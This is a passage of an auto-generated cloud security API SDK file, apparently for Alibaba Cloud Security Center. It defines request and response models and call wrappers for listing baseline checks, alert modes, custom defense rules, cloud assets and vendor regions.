  body?: ListCheckRuleInstanceResponseBody(name='body'),
}

/**
 * @summary List all effective machines under the rule
 *
 * @param request ListCheckRuleInstanceRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListCheckRuleInstanceResponse
 */
async function listCheckRuleInstanceWithOptions(request: ListCheckRuleInstanceRequest, runtime: Util.RuntimeOptions): ListCheckRuleInstanceResponse {
  Util.validateModel(request);
  var query = OpenApiUtil.query(Util.toMap(request));
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCheckRuleInstance',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'GET',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary List all effective machines under the rule
 *
 * @param request ListCheckRuleInstanceRequest
 * @return ListCheckRuleInstanceResponse
 */
async function listCheckRuleInstance(request: ListCheckRuleInstanceRequest): ListCheckRuleInstanceResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCheckRuleInstanceWithOptions(request, runtime);
}

model ListCheckStandardRequest {
  instanceIds?: [ string ](name='InstanceIds', description='The instance IDs of the cloud services to which the check items belong.'),
  instanceSubTypes?: [ string ](name='InstanceSubTypes', description='The subtypes of cloud services.'),
  instanceTypes?: [ string ](name='InstanceTypes', description='The asset types of cloud services.'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  vendors?: [ string ](name='Vendors', description='The cloud service providers. Valid values:

*   **ALIYUN**: Alibaba Cloud.
*   **TENCENT**: Tencent Cloud.
*   **HUAWEICLOUD**: Huawei Cloud.
*   **MICROSOFT**: Microsoft Azure.
*   **AWS**: Amazon Web Services (AWS).'),
}

model ListCheckStandardResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='FA91FBDA-***'),
  standards?: [ 
    {
      bindVendor?: int32(name='BindVendor', description='The cloud service provider that uses the standard. Valid values:

*   **0**: Alibaba Cloud.
*   **3**: Tencent Cloud.
*   **4**: Huawei Cloud.
*   **5**: Microsoft Azure.
*   **7**: AWS.', example='3'),
      id?: long(name='Id', description='The ID of the standard.', example='1'),
      requirements?: [ 
        {
          id?: long(name='Id', description='The ID of the requirement.', example='11'),
          riskCheckCount?: long(name='RiskCheckCount', description='The number of check items in the requirement.', example='10'),
          showName?: string(name='ShowName', description='The display name of the search condition.', example='RAM identity authentication'),
          showPriorityLevel?: int32(name='ShowPriorityLevel', description='The priority for display.', example='1'),
        }
      ](name='Requirements', description='The requirements.'),
      showName?: string(name='ShowName', description='The display name of the check item.', example='Identity and permission management'),
      showPriorityLevel?: int32(name='ShowPriorityLevel', description='The priority for display.', example='1'),
      type?: string(name='Type', description='The type of the standard.', example='IDENTITY_PERMISSION'),
    }
  ](name='Standards', description='The standards.'),
}

model ListCheckStandardResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListCheckStandardResponseBody(name='body'),
}

/**
 * @summary Queries the standards of configuration checks.
 *
 * @param request ListCheckStandardRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListCheckStandardResponse
 */
async function listCheckStandardWithOptions(request: ListCheckStandardRequest, runtime: Util.RuntimeOptions): ListCheckStandardResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  if (!Util.isUnset(request.instanceSubTypes)) {
    query['InstanceSubTypes'] = request.instanceSubTypes;
  }
  if (!Util.isUnset(request.instanceTypes)) {
    query['InstanceTypes'] = request.instanceTypes;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.vendors)) {
    query['Vendors'] = request.vendors;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCheckStandard',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the standards of configuration checks.
 *
 * @param request ListCheckStandardRequest
 * @return ListCheckStandardResponse
 */
async function listCheckStandard(request: ListCheckStandardRequest): ListCheckStandardResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCheckStandardWithOptions(request, runtime);
}

model ListCheckTypesRequest {
  currentPage?: int32(name='CurrentPage', description='The page number. Default value: **1**.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20. If you leave this parameter empty, 20 entries are returned per page.

>  We recommend that you do not leave this parameter empty.', example='20'),
  riskId?: long(name='RiskId', description='The ID of the baseline.

>  You can call the [DescribeCheckWarningSummary](https://help.aliyun.com/document_detail/116179.html) operation to query the IDs of baselines.', example='34'),
  showChecks?: boolean(name='ShowChecks', description='Whether to query the check item list. The default value is false. Valid values:

- **false**: Not Query
- **true**: Query', example='false'),
  source?: string(name='Source', description='The data source. Default value: **default**. Valid values:

*   **agentless**: The check items of baselines for agentless detection.
*   **default**: The check items of baselines for hosts.', example='agentless'),
  uuid?: string(name='Uuid', description='The UUID of the server.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='293b07cb-db2d-4f39-941f-b2e4abb8****'),
}

model ListCheckTypesResponseBody = {
  code?: string(name='Code', description='The response code.', example='200'),
  count?: int32(name='Count', description='The total number of entries returned.', example='10'),
  data?: [ 
    {
      checkDetails?: [ 
        {
          affiliatedRiskTypes?: [ string ](name='AffiliatedRiskTypes', description='The list of the baseline categories of attribution.'),
          affiliatedRisks?: [ string ](name='AffiliatedRisks', description='The list of baselines attribution.'),
          checkId?: long(name='CheckId', description='The ID of the check item.', example='31'),
          checkItem?: string(name='CheckItem', description='The description of the check item.', example='Configure the idle session timeout period.'),
        }
      ](name='CheckDetails', description='The detail of check items.'),
      checkType?: string(name='CheckType', description='The type of the check item.', example='data_integrity'),
      checkTypeDisName?: string(name='CheckTypeDisName', description='The display name of the check item type.', example='Data Integrity'),
    }
  ](name='Data', description='The data returned.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='D65AADFC-1D20-5A6A-8F6A-9FA53C0D****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model ListCheckTypesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListCheckTypesResponseBody(name='body'),
}

/**
 * @summary Queries the types of check items that meet the specified conditions based on the ID of a baseline.
 *
 * @param request ListCheckTypesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListCheckTypesResponse
 */
async function listCheckTypesWithOptions(request: ListCheckTypesRequest, runtime: Util.RuntimeOptions): ListCheckTypesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  if (!Util.isUnset(request.showChecks)) {
    query['ShowChecks'] = request.showChecks;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCheckTypes',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the types of check items that meet the specified conditions based on the ID of a baseline.
 *
 * @param request ListCheckTypesRequest
 * @return ListCheckTypesResponse
 */
async function listCheckTypes(request: ListCheckTypesRequest): ListCheckTypesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCheckTypesWithOptions(request, runtime);
}

model ListClientAlertModeRequest {
  mode?: string(name='Mode', description='The protection mode. Valid values:

*   **strict**: The strict mode. False positives may be generated. We recommend that you enable this mode during major events.
*   **balance**: The balanced mode. More risks can be detected with less false positives in this mode.', example='strict'),
}

model ListClientAlertModeResponseBody = {
  data?: {
    count?: int32(name='Count', description='The total number of entries returned.', example='5'),
    uuids?: [ string ](name='Uuids', description='The UUIDs of the assets.'),
  }(name='Data', description='The response parameters.'),
  requestId?: string(name='RequestId', description='The request ID.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model ListClientAlertModeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListClientAlertModeResponseBody(name='body'),
}

/**
 * @summary Queries the alert settings of assets. By default, the balanced mode is enabled. A detected list of assets can be returned only in strict mode.
 *
 * @param request ListClientAlertModeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListClientAlertModeResponse
 */
async function listClientAlertModeWithOptions(request: ListClientAlertModeRequest, runtime: Util.RuntimeOptions): ListClientAlertModeResponse {
  Util.validateModel(request);
  var query = OpenApiUtil.query(Util.toMap(request));
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListClientAlertMode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'GET',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the alert settings of assets. By default, the balanced mode is enabled. A detected list of assets can be returned only in strict mode.
 *
 * @param request ListClientAlertModeRequest
 * @return ListClientAlertModeResponse
 */
async function listClientAlertMode(request: ListClientAlertModeRequest): ListClientAlertModeResponse {
  var runtime = new Util.RuntimeOptions{};
  return listClientAlertModeWithOptions(request, runtime);
}

model ListClientUserDefineRuleTypesResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='340D7FC4-D575-1661-8ACD-CFA7BE57****'),
  userDefineRuleTypes?: [ string ](name='UserDefineRuleTypes', description='An array consisting of the rule types that are supported.'),
}

model ListClientUserDefineRuleTypesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListClientUserDefineRuleTypesResponseBody(name='body'),
}

/**
 * @summary Queries the supported types of custom defense rules.
 *
 * @param request ListClientUserDefineRuleTypesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListClientUserDefineRuleTypesResponse
 */
async function listClientUserDefineRuleTypesWithOptions(runtime: Util.RuntimeOptions): ListClientUserDefineRuleTypesResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'ListClientUserDefineRuleTypes',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the supported types of custom defense rules.
 *
 * @return ListClientUserDefineRuleTypesResponse
 */
async function listClientUserDefineRuleTypes(): ListClientUserDefineRuleTypesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listClientUserDefineRuleTypesWithOptions(runtime);
}

model ListClientUserDefineRulesRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.

This parameter is required.', example='1'),
  name?: string(name='Name', description='The name of the rule.', example='Rule\\\\*\\\\*\\\\*\\\\*'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.

This parameter is required.', example='10'),
  type?: [ int32 ](name='Type', description='The types of rules.'),
}

model ListClientUserDefineRulesResponseBody = {
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB393***'),
  userDefineRuleList?: [ 
    {
      actionType?: int32(name='ActionType', description='The action of the rule. Valid values:

*   **0**: allow
*   **1**: block', example='0'),
      id?: long(name='Id', description='The ID of the rule.', example='200****'),
      name?: string(name='Name', description='The name of the rule.', example='Rule\\\\*\\\\*\\\\*\\\\*'),
      platform?: string(name='Platform', description='The type of the operating system. Valid values:

*   **windows**: Windows
*   **linux**: Linux
*   **all**: all types', example='linux'),
      switchId?: string(name='SwitchId', description='The switch ID of the rule.', example='USER-DEFINE-RULE-SWITCH-TYPE_200****'),
      type?: int32(name='Type', description='The type of the rule. Valid values:

*   **1**: Process hash
*   **2**: Command line
*   **3**: Process Network
*   **4**: File Read and Write
*   **5**: Operation on Registry
*   **6**: Dynamic-link Library Loading
*   **7**: File Renaming', example='1'),
    }
  ](name='UserDefineRuleList', description='An array that consists of the rules.'),
}

model ListClientUserDefineRulesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListClientUserDefineRulesResponseBody(name='body'),
}

/**
 * @summary Queries custom defense rules.
 *
 * @param request ListClientUserDefineRulesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListClientUserDefineRulesResponse
 */
async function listClientUserDefineRulesWithOptions(request: ListClientUserDefineRulesRequest, runtime: Util.RuntimeOptions): ListClientUserDefineRulesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListClientUserDefineRules',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries custom defense rules.
 *
 * @param request ListClientUserDefineRulesRequest
 * @return ListClientUserDefineRulesResponse
 */
async function listClientUserDefineRules(request: ListClientUserDefineRulesRequest): ListClientUserDefineRulesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listClientUserDefineRulesWithOptions(request, runtime);
}

model ListCloudAssetInstancesRequest {
  cloudAssetTypes?: [ 
    {
      assetSubType?: int32(name='AssetSubType', description='The subtype of the cloud asset.

You can call the [GetCloudAssetCriteria](~~GetCloudAssetCriteria~~) operation to query the subtype of the cloud asset.', example='0'),
      assetType?: int32(name='AssetType', description='The type of the cloud asset.

You can call the [GetCloudAssetCriteria](~~GetCloudAssetCriteria~~) operation to query the cloud asset type.', example='18'),
      vendor?: int32(name='Vendor', description='The server type. Valid values:

*   **0**: a cloud asset provided by Alibaba Cloud
*   **1**: a cloud asset outside Alibaba Cloud
*   **2**: a cloud asset in a data center
*   **3**, **4**, **5**, and **7**: a cloud asset provided by a third-party service provider
*   **8**: a lightweight cloud asset', example='0'),
    }
  ](name='CloudAssetTypes', description='The details of the cloud asset.'),
  criteria?: string(name='Criteria', description='The search conditions for assets. The value of this parameter is in the JSON format and contains the following fields:

*   **name**: the name of the search condition.

*   **value**: the value of the search condition.

*   **logicalExp**: the logical relation for multiple search conditions. Valid values:

    *   **OR**: The search conditions use a logical **OR**.
    *   **AND**: The search conditions use a logical **AND**.

> You can call the [GetCloudAssetCriteria](~~GetCloudAssetCriteria~~) operation to query supported search conditions.', example='[{\\\\"name\\\\":\\\\"internetIp\\\\",\\\\"value\\\\":\\\\"192.168\\\\",\\\\"logicalExp\\\\":\\\\"OR\\\\"}]'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='2'),
  logicalExp?: string(name='LogicalExp', description='The logical relation for multiple search conditions. Valid values:

*   **OR**: The search conditions use a logical **OR**.
*   **AND**: The search conditions use a logical **AND**.', example='OR'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Maximum value: 100. Default value: 20.', example='20'),
  regionId?: string(name='RegionId', description='The region ID of the instance.', example='cn-hangzhou'),
}

model ListCloudAssetInstancesResponseBody = {
  instances?: [ 
    {
      alarmStatus?: string(name='AlarmStatus', description='Indicates whether alerts are generated for the cloud asset. Valid values:

*   **YES**
*   **NO**', example='NO'),
      assetSubType?: string(name='AssetSubType', description='The subtype of the cloud service. The subtype of the cloud asset. Valid values:

*   **0**: ECS

    *   **0**: instance
    *   **1**: disk (storage)
    *   **2**: security group

*   **1**: SLB

    *   **0**: SLB
    *   **1**: Application Load Balancer (ALB)

*   **3**: ApsaraDB RDS

    *   **0**: instance

*   **4**: ApsaraDB for MongoDB

    *   **0**: instance

*   **5**: ApsaraDB for Redis

    *   **0**: instance

*   **6**: Container Registry

    *   **1**: Enterprise Edition
    *   **2**: Personal Edition

*   **8**: ACK

    *   **0**: cluster

*   **9**: VPC

    *   **0**: NAT gateway
    *   **1**: EIP
    *   **2**: VPN
    *   **3**: FLOW_LOG

*   **11**: ActionTrail

    *   **0**: trail

*   **12**: Alibaba Cloud CDN

    *   **0**: instance

*   **13**: Certificate Management Service (formerly SSL Certificates Service)

    *   **0**: certificate

*   **14**: Apsara Devops

    *   **0**: organization

*   **16**: Anti-DDoS

    *   **0**: instance

*   **17**: WAF

    *   **0**: domain name

*   **18**: OSS

    *   **0**: bucket

*   **19**: PolarDB

    *   **0**: cluster

*   **20**: ApsaraDB RDS for PostgreSQL

    *   **0**: instance

*   **21**: MSE

    *   **0**: cluster

*   **22**: NAS

    *   **0**: file system

*   **23**: DSC

    *   **0**: instance

*   **24**: EIP

    *   **0**: Anycast EIP

*   **25**: IDaaS EIAM

    *   **0**: instance

*   **26**: PolarDB-X

    *   **0**: instance

*   **27**: Elasticsearch

    *   **0**: instance', example='0'),
      assetSubTypeName?: string(name='AssetSubTypeName', description='The subtype name of the cloud asset.', example='SECURITY_GROUP'),
      assetType?: int32(name='AssetType', description='The type of the cloud asset. Valid values:

*   **0**: Elastic Compute Service (ECS)
*   **1**: Server Load Balancer (SLB)
*   **3**: ApsaraDB RDS
*   **4**: ApsaraDB for MongoDB
*   **5**: ApsaraDB for Redis
*   **6**: Container Registry
*   **8**: Container Service for Kubernetes (ACK)
*   **9**: Virtual Private Cloud (VPC)
*   **11**: ActionTrail
*   **12**: Alibaba Cloud CDN
*   **13**: Certificate Management Service (formerly SSL Certificates Service)
*   **14**: Apsara Devops
*   **16**: Anti-DDoS
*   **17**: Web Application Firewall (WAF)
*   **18**: Object Storage Service (OSS)
*   **19**: PolarDB
*   **20**: ApsaraDB RDS for PostgreSQL
*   **21**: Microservices Engine (MSE)
*   **22**: File Storage NAS (NAS)
*   **23**: Data Security Center (DSC)
*   **24**: Elastic IP Address (EIP)
*   **25**: Identity as a Service (IDaaS) Employee Identity and Access Management (EIAM)
*   **26**: PolarDB-X
*   **27**: Elasticsearch', example='0'),
      assetTypeName?: string(name='AssetTypeName', description='The type name of the cloud asset.', example='ECS'),
      createdTime?: long(name='CreatedTime', description='The time when the instance was created.', example='1607365213000'),
      instanceId?: string(name='InstanceId', description='The instance ID of the cloud asset.', example='d-uf60vevzkztnflx7cny5'),
      instanceName?: string(name='InstanceName', description='The instance name of the cloud asset.', example='yztest-l***'),
      internetIp?: string(name='InternetIp', description='The public IP address of the cloud asset.', example='1.2.XX.XX'),
      regionId?: string(name='RegionId', description='The ID of the region to which the cloud asset belongs.', example='cn-hanghzou'),
      riskStatus?: string(name='RiskStatus', description='Indicates whether risks are detected on the cloud asset. Valid values:

*   **YES**
*   **NO**', example='NO'),
      securityInfo?: string(name='SecurityInfo', description='The security information about the cloud asset.', example='{"seriousNum":0,"appNum":0,"baselineMedium":0,"remindNum":0,"imageVulNntf":0,"cveNum":0,"vul":0,"uuid":"yuejia-test","emgNum":0,"weakPWNum":0,"imageMaliciousFileRemind":0,"imageBaselineMedium":0,"laterVulCount":0,"cmsNum":0,"imageMaliciousFileSerious":0,"agentlessMalicious":0,"suspNum":0,"imageBaselineHigh":0,"asapVulCount":0,"imageVulLater":0,"agentlessAll":0,"sysNum":0,"containerLater":0,"containerSuspicious":0,"imageBaselineNum":0,"newSuspicious":0,"nntfVulCount":0,"scaNum":0,"containerNntf":0,"health":0,"trojan":0,"suspicious":0,"imageMaliciousFileSuspicious":0,"containerRemind":0,"baselineLow":0,"imageVulAsap":0,"imageBaselineLow":0,"containerAsap":0,"agentlessBaseline":0,"agentlessVulSca":0,"agentlessVulCve":0,"containerSerious":0,"baselineHigh":0,"account":0,"baselineNum":5}'),
      vendor?: int32(name='Vendor', description='The service provider (SP) of the cloud asset. Valid values:

*   **0**: a cloud asset provided by Alibaba Cloud
*   **1**: a third-party cloud asset
*   **2**: a cloud asset in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a lightweight cloud asset', example='0'),
    }
  ](name='Instances', description='The details of the cloud assets.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='2'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='100'),
    totalCount?: int32(name='TotalCount', description='The total number of cloud assets.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='028CF634-5268-5660-9575-48C9ED6BF880'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ListCloudAssetInstancesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListCloudAssetInstancesResponseBody(name='body'),
}

/**
 * @summary Queries cloud service assets.
 *
 * @param request ListCloudAssetInstancesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListCloudAssetInstancesResponse
 */
async function listCloudAssetInstancesWithOptions(request: ListCloudAssetInstancesRequest, runtime: Util.RuntimeOptions): ListCloudAssetInstancesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.cloudAssetTypes)) {
    query['CloudAssetTypes'] = request.cloudAssetTypes;
  }
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCloudAssetInstances',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries cloud service assets.
 *
 * @param request ListCloudAssetInstancesRequest
 * @return ListCloudAssetInstancesResponse
 */
async function listCloudAssetInstances(request: ListCloudAssetInstancesRequest): ListCloudAssetInstancesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCloudAssetInstancesWithOptions(request, runtime);
}

model ListCloudVendorRegionsRequest {
  lang?: string(name='Lang', description='The language of the content in the request and response messages. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en'),
  vendor?: string(name='Vendor', description='The service provider of cloud assets. Valid values:

*   **Tencent**, **HUAWEICLOUD**, **Azure**, and **AWS**: other service providers of cloud assets.', example='Tencent'),
}

model ListCloudVendorRegionsResponseBody = {
  code?: string(name='Code', description='The return code.', example='200'),
  count?: int32(name='Count', description='The total number of returned entries.', example='2'),
  data?: [ 
    {
      area?: string(name='Area', description='The area to which the region belongs. The valid values vary based on the value of the Vendor parameter.

*   Valid values if **Vendor** is set to Tencent:
*   **cn**: China
*   **southeast_asia**: Southeast Asia Pacific
*   **northeast_asia**: Northeast Asia Pacific
*   **southern_asia**: South Asia Pacific
*   **north_America**: North America
*   **south_America**: South America
*   **western_America**: Western United States
*   **eastern_America**: Eastern United States
*   **european**: Europe
*   Valid values if **Vendor** is set to HUAWEICLOUD:
*   **cn**: China
*   **africa**: Africa
*   **latin_america**: Latin America
*   **asia**: Asia Pacific
*   Valid values if **Vendor** is set to Azure:
*   **middle_east**: Middle East
*   **south_america**: South America
*   **canada**: Canada
*   **asia-pacific**: Asia Pacific
*   **europe**: Europe
*   **africa**: Africa
*   **us**: United States
*   **other**: other regions
*   Valid values if **Vendor** is set to AWS:
*   **cn**: China
*   **us**: United States
*   **eu**: Europe
*   **asia**: Asia Pacific
*   **south_america**: South America
*   **me**: Middle East
*   **ca**: Canada
*   **af**: Africa', example='cn'),
      disable?: int32(name='Disable', description='Indicates whether the region is configured as a synchronization region on another site. Valid values:

*   **0**: The region is not configured as a synchronization region on another site.
*   **1**: The region is configured as a synchronization region on another site.', example='1'),
      regionId?: string(name='RegionId', description='The region ID.', example='cn-hangzhou'),
      selected?: int32(name='Selected', description='Indicates whether the region is configured as a synchronization region on this site. Valid values:

*   **0**: The region is not configured as a synchronization region on this site.
*   **1**: The region is configured as a synchronization region on this site.', example='0'),
    }
  ](name='Data', description='The regions that the service provider supports.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='C87EC6AD-4590-5546-9DF6-B8956579D***'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ListCloudVendorRegionsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListCloudVendorRegionsResponseBody(name='body'),
}

/**
 * @summary Queries the synchronization region configurations of other clouds on a site.
 *
 * @param request ListCloudVendorRegionsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListCloudVendorRegionsResponse
 */
async function listCloudVendorRegionsWithOptions(request: ListCloudVendorRegionsRequest, runtime: Util.RuntimeOptions): ListCloudVendorRegionsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.vendor)) {
    query['Vendor'] = request.vendor;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCloudVendorRegions',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the synchronization region configurations of other clouds on a site.
 *
 * @param request ListCloudVendorRegionsRequest
 * @return ListCloudVendorRegionsResponse
 */
async function listCloudVendorRegions(request: ListCloudVendorRegionsRequest): ListCloudVendorRegionsResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCloudVendorRegionsWithOptions(request, runtime);
}

model ListClusterCnnfStatusDetailRequest {
  clusterIds?: [ string ](name='ClusterIds', description='An array that consists of the ID of the cluster.'),
}

model ListClusterCnnfStatusDetailResponseBody = {
  data?: [ 
    {
      clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='c8ca91e0907d94efaba7fb0827eb9****'),
      installed?: boolean(name='Installed', description='Indicates whether the container firewall plug-in is installed.', example='true'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-bp180bogui4fc0z4****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the associated instance.', example='172.16.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the associated instance.', example='10.42.XX.XX'),
      invalidType?: string(name='InvalidType', description='The cause why the plug-in is invalid. Valid values:

*   **PLUGIN_OFFLINE**: The plug-in is offline.
